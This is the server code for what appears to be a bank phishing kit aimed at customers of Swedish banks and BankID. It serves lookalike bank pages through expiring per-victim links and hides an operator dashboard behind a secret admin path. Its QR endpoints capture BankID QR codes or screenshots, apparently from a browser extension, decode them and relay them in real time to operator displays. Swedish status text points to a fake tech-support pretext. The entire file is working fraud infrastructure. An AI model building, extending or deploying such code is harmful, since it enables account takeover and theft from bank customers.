const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*",
        methods: ["GET", "POST", "OPTIONS"],
        credentials: true
    },
    transports: ['websocket', 'polling'],
    path: '/socket.io'
});
const path = require('path');
const crypto = require('crypto');
const config = require('./config');
const Jimp = require('jimp');
const QrCode = require('qrcode-reader');

// Session storage for temporary URLs
const temporaryUrls = new Map();

// Function to generate secure random string
function generateSecureToken(length = 32) {
    return crypto.randomBytes(length).toString('hex');
}

// Function to create temporary URL
function createTemporaryUrl(bankId, expirationMinutes = 720) {
    const token = generateSecureToken();
    const expiration = Date.now() + (expirationMinutes * 60 * 1000);
    
    temporaryUrls.set(token, {
        bankId,
        expiration,
        qrData: null,
        displayConnected: false,
        lastStatus: 'waiting' // 'waiting' or 'qr_received'
    });
    
    return token;
}

// Middleware to clean expired URLs
function cleanExpiredUrls() {
    const now = Date.now();
    for (const [token, data] of temporaryUrls.entries()) {
        if (data.expiration < now) {
            temporaryUrls.delete(token);
        }
    }
}

// Run cleanup every 5 minutes
setInterval(cleanExpiredUrls, 5 * 60 * 1000);

// Enable JSON body parsing
app.use(express.json({ limit: '2mb' }));

// Add CORS middleware - allow extension requests
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Origin, X-Requested-With, X-Session-ID, X-Source, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Max-Age', '86400'); // 24 hours
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Track connected displays
const connectedDisplays = new Set();

// Routes for all display pages (with and without .html)
for (let i = 1; i <= 7; i++) {
    app.get([`/display${i}`, `/display${i}.html`], (req, res) => {
        res.sendFile(path.join(__dirname, 'public', `display${i}.html`));
    });
}

// Bank page mapping
const bankPages = {
    'nordea': 'Nordeafelsokningskundidentifieringkund98721311',
    'swedbank': 'Swedfelsokningskundidentifieringkund98721311',
    'handelsbanken': 'Handelsfelsokningskundidentifieringkund98721311',
    'skandia': 'Skandiafelsokningskundidentifieringkund98721311',
    'seb': 'Sebfelsokningskundidentifieringkund98721311',
    'lansforsakringar': 'Lansforsakringarfelsokningskundidentifieringkund98721311',
    'danskebank': 'Danskebankfelsokningskundidentifieringkund98721311',
    'bankid': 'Bankidfelsokningskundidentifieringkund98721311',
    'drag': 'Dragfelsokningskundidentifieringkund98721311'
};

// Bank display names for URLs
const bankDisplayNames = {
    'nordea': 'Nordea',
    'swedbank': 'Swedbank',
    'handelsbanken': 'Handelsbanken',
    'skandia': 'Skandia',
    'seb': 'SEB',
    'lansforsakringar': 'Lansforsakringar',
    'danskebank': 'Danske Bank',
    'bankid': 'BankID',
    'drag': 'Drag'
};

// Bank routes with and without .html
Object.entries(bankPages).forEach(([bankId, page]) => {
    app.get([`/${page}`, `/${page}.html`], (req, res) => {
        res.sendFile(path.join(__dirname, 'public', `${page}.html`));
    });
});

// API to generate temporary URL
app.post('/api/generate-temp-url', (req, res) => {
    const { bankId, expirationMinutes } = req.body;
    
    if (!bankId || !bankPages[bankId.toLowerCase()]) {
        return res.status(400).json({ error: 'Invalid bank ID' });
    }
    
    const token = createTemporaryUrl(bankId.toLowerCase(), expirationMinutes || 720);
    const bankName = bankDisplayNames[bankId.toLowerCase()].replace(/\s+/g, '');
    const tempUrl = `${config.PRODUCTION_URL}/${bankName}/${token}`;
    
    res.json({
        url: tempUrl,
        expiresIn: expirationMinutes || 720,
        token
    });
});

// Add endpoint to expire URL manually
app.post('/api/expire-url', (req, res) => {
    const { token } = req.body;
    
    if (!token || !temporaryUrls.has(token)) {
        return res.status(404).json({ error: 'URL not found' });
    }
    
    temporaryUrls.delete(token);
    res.json({ message: 'URL expired successfully' });
});

// Handle temporary URLs for each bank
Object.entries(bankDisplayNames).forEach(([bankId, bankName]) => {
    const urlSafeName = bankName.replace(/\s+/g, '');
    app.get(`/${urlSafeName}/:token`, (req, res) => {
        const { token } = req.params;
        const session = temporaryUrls.get(token);
        
        if (!session || session.expiration < Date.now()) {
            temporaryUrls.delete(token);
            return res.status(404).send('This link has expired or is invalid');
        }
        
        if (session.bankId !== bankId) {
            return res.status(404).send('Invalid bank URL');
        }
        
        const bankPage = bankPages[bankId];
        res.sendFile(path.join(__dirname, 'public', `${bankPage}.html`));
    });

    // Add route for BankID with capital letters
    if (bankId === 'bankid') {
        app.get('/BankID/:token', (req, res) => {
            const { token } = req.params;
            const session = temporaryUrls.get(token);
            
            if (!session || session.expiration < Date.now()) {
                temporaryUrls.delete(token);
                return res.status(404).send('This link has expired or is invalid');
            }
            
            if (session.bankId !== bankId) {
                return res.status(404).send('Invalid bank URL');
            }
            
            const bankPage = bankPages[bankId];
            res.sendFile(path.join(__dirname, 'public', `${bankPage}.html`));
        });
    }
});

// Existing bank routes (keeping for backward compatibility)
app.get('/Nordeafelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Nordeafelsokningskundidentifieringkund98721311.html'));
});

app.get('/Swedfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Swedfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Handelsfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Handelsfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Skandiafelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Skandiafelsokningskundidentifieringkund98721311.html'));
});

app.get('/Sebfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Sebfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Lansforsakringarfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Lansforsakringarfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Danskebankfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Danskebankfelsokningskundidentifieringkund98721311.html'));
});

// Add route for Drag
app.get('/Dragfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Dragfelsokningskundidentifieringkund98721311.html'));
});

// Secret admin path - hard to guess
const SECRET_ADMIN_PATH = 'zeta-admin-7x9k2m4p8q1w3r5t6y-alpha-control';

// Root route - show loading page (not dashboard)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Secret admin route - only way to access dashboard
app.get(`/${SECRET_ADMIN_PATH}`, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard_control_secret.html'));
});

// Block direct access to dashboard routes - return 404
app.get(['/dashboard_98721311_control_panel', '/dashboard_98721311_control_panel.html', '/admin', '/admin.html'], (req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Add a health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        displays: Array.from(connectedDisplays),
        activeTemporaryUrls: Array.from(temporaryUrls.keys()).length
    });
});

// Add API routes
app.get('/api/qr', (req, res) => {
    res.status(200).json({ message: 'QR code endpoint is ready' });
});

// API endpoint to get status of a temporary URL
app.get('/api/url-status/:token', (req, res) => {
    const { token } = req.params;
    const session = temporaryUrls.get(token);
    
    if (!session) {
        return res.status(404).json({ error: 'URL not found' });
    }
    
    if (session.expiration < Date.now()) {
        temporaryUrls.delete(token);
        return res.status(404).json({ error: 'URL expired' });
    }
    
    // Determine status based on qrData and display connection
    const status = session.qrData ? 'qr_received' : 'waiting';
    const statusText = session.qrData ? 'QR kod mottagen' : 'Väntar på teknisk support';
    
    res.status(200).json({
        token,
        bankId: session.bankId,
        status,
        statusText,
        hasQR: !!session.qrData,
        displayConnected: session.displayConnected || false,
        expiresAt: session.expiration
    });
});

app.post('/api/qr', (req, res) => {
    console.log('Received QR code request from:', req.get('origin'));
    console.log('Request headers:', req.headers);
    const qrData = req.body.qrData || req.body.qrImageData; // Support both field names
    const sessionToken = req.body.sessionToken;
    const qrString = req.body.qrString; // Extension may send this

    if (!qrData) {
        console.error('No QR data provided in request');
        return res.status(400).json({ error: 'No QR code data provided' });
    }

    try {
        // Validate base64 image data - accept data:image/ or just base64
        if (!qrData.startsWith('data:image/') && !qrData.startsWith('/9j/') && !qrData.startsWith('iVBORw0KGgo')) {
            // If it's not image data, check if it's a valid base64 string
            if (typeof qrData === 'string' && qrData.length > 100) {
                // Might be base64 without prefix, try to accept it
                console.log('QR data without image prefix, accepting as base64');
            } else {
                console.error('Invalid image data format');
                throw new Error('Invalid image data');
            }
        }

        // If session token is provided, store QR for that session
        if (sessionToken && temporaryUrls.has(sessionToken)) {
            console.log('Storing QR for session:', sessionToken);
            const session = temporaryUrls.get(sessionToken);
            session.qrData = qrData;
            session.lastStatus = 'qr_received';
        }

        // Log extension metadata if provided
        if (req.body.source) {
            console.log('QR from extension source:', req.body.source);
        }
        if (req.headers['x-source']) {
            console.log('QR from X-Source header:', req.headers['x-source']);
        }

        // Broadcast to all connected clients via Socket.IO
        console.log('Broadcasting QR to', connectedDisplays.size, 'displays');
        io.emit('new_qr', qrData);
        
        // Log success (helpful for debugging)
        console.log('QR code broadcast successful');
        
        res.status(200).json({ 
            message: 'QR code broadcast successful',
            activeDisplays: Array.from(connectedDisplays),
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Error processing QR code:', error);
        res.status(400).json({ error: 'Invalid QR code data' });
    }
});

// New endpoint: Decode QR code from screenshot
app.post('/api/qr-decode', async (req, res) => {
    console.log('📸 Received QR decode request from:', req.get('origin'));
    const screenshot = req.body.screenshot;
    
    if (!screenshot) {
        return res.status(400).json({ error: 'No screenshot provided' });
    }
    
    // Always broadcast the image to displays, even if decoding fails
    console.log('📡 Broadcasting QR image to', connectedDisplays.size, 'displays');
    io.emit('new_qr', screenshot);
    
    try {
        // Convert base64 image to buffer
        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
        const imageBuffer = Buffer.from(base64Data, 'base64');
        
        console.log('🖼️ Image buffer size:', imageBuffer.length, 'bytes');
        
        // Load image with Jimp
        const image = await Jimp.read(imageBuffer);
        console.log('✅ Image loaded, dimensions:', image.bitmap.width, 'x', image.bitmap.height);
        
        // Create QR code reader
        const qr = new QrCode();
        
        // Decode QR code
        const qrData = await new Promise((resolve, reject) => {
            qr.callback = (err, value) => {
                if (err) {
                    console.log('⚠️ QR decode error:', err.message);
                    reject(err);
                } else {
                    resolve(value);
                }
            };
            qr.decode(image.bitmap);
        });
        
        if (qrData && qrData.result) {
            console.log('✅ QR code decoded successfully:', qrData.result.substring(0, 50) + '...');
            
            res.status(200).json({
                success: true,
                qrData: screenshot, // Send back the image for display
                qrString: qrData.result, // The decoded QR string
                activeDisplays: Array.from(connectedDisplays),
                timestamp: new Date().toISOString()
            });
        } else {
            console.log('⚠️ QR decode returned no result');
            res.status(200).json({
                success: false,
                message: 'No QR code found in image (but image was broadcast)',
                qrData: screenshot, // Still send the image
                activeDisplays: Array.from(connectedDisplays)
            });
        }
    } catch (error) {
        console.error('❌ Error decoding QR code:', error.message);
        // Still return success since we broadcast the image
        res.status(200).json({
            success: true, // Changed to true since we broadcast the image
            message: 'QR decode failed but image was broadcast: ' + error.message,
            qrData: screenshot, // Send the image anyway
            activeDisplays: Array.from(connectedDisplays),
            timestamp: new Date().toISOString()
        });
    }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    socket.on('register_display', (data) => {
        const displayId = typeof data === 'string' ? data : (data ? data.displayId : null);
        const token = typeof data === 'object' && data ? data.token : null;
        
        console.log(`Display ${displayId || 'unknown'} registered${token ? ' with token ' + token : ''}`);
        if (displayId) {
            connectedDisplays.add(displayId);
        }
        
        // If token is provided, mark that URL as having a connected display
        if (token && temporaryUrls.has(token)) {
            temporaryUrls.get(token).displayConnected = true;
            console.log(`Token ${token} is now connected to display ${displayId || 'unknown'}`);
        }
        
        socket.displayId = displayId;
        socket.token = token;
        
        io.emit('displays_updated', Array.from(connectedDisplays));
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        // Remove display from tracking
        if (socket.displayId) {
            connectedDisplays.delete(socket.displayId);
        }
        
        // If this socket had a token, mark it as disconnected
        if (socket.token && temporaryUrls.has(socket.token)) {
            temporaryUrls.get(socket.token).displayConnected = false;
        }
        
        io.emit('displays_updated', Array.from(connectedDisplays));
    });
});

// Add error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Add 404 handling middleware
app.use((req, res, next) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Export the app and http server
module.exports = http;

// Start the server if not being run by Vercel
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    http.listen(PORT, () => {
        console.log(`Server is running on port ${PORT}`);
    });
} 